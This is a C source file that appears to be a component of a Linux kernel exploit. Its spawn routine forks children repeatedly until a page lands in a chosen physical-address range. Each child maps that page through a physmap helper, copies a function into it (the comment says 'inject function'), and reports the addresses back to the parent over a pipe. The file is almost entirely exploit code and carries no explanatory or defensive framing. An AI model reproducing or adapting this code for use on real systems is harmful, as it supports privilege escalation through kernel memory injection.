#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include <pthread.h>
#include <dlfcn.h>
#include "spawn.h"
#include "pagemap.h"
#include "func.h"

void child(PhyPointer p, int fd) {
    char buf[256];
    int n;
    PhyPointer ret = physmap_page(p);
    ret = copyfunc(ret); //inject function
    printf("ret:: %p %p\n",ret.v, ret.p);
    snprintf(buf,sizeof(buf),"%p %p\n",ret.v,ret.p);
    printf("send txt \"%s\"\n",buf);
    fflush(stdout);
    n = write(fd,buf,strlen(buf));
    printf("sleeping for ever %d\n",n);
    fflush(stdout);
    sleep(60000);
}

#define PHYS_MAX 0xec8fa760
#define PHYS_MIN 0xc0000000
PhyPointer spawn(PhyPointer p) {
    int fd[2];
    int n;
    char buf[256];
    pid_t childpid;

    printf("p.p == %lu\n",(unsigned long) p.p);
    while((unsigned long)p.p > PHYS_MAX 
            || (unsigned long)p.p < PHYS_MIN) {
        printf("getting pointer\n");
        pipe(fd);
        childpid = fork();
        switch(childpid) {
            case -1:
                perror("failed to fork");
                exit(1);
                return p;
            case 0: /*child proc*/
                {
                    printf("in child???\n");
                    fflush(stdout);
                    close(fd[0]); //child closes (output fd)
                    child(p,fd[1]);
                }
            default: /*parent process*/
                {
                    printf("in parent???\n");
                    fflush(stdout);
                    close(fd[1]); //parent closes (intput fd);
                    n = 0;
                    n =read(fd[0],buf,sizeof(buf));
                    printf("read %d\n",n);
                    fflush(stdout);
                    sscanf(buf,"%p %p\n", &p.v, &p.p);
                    printf("child sent %p %p\n", p.v, p.p);
                    fflush(stdout);
                }
        }
    }
    return p;
}
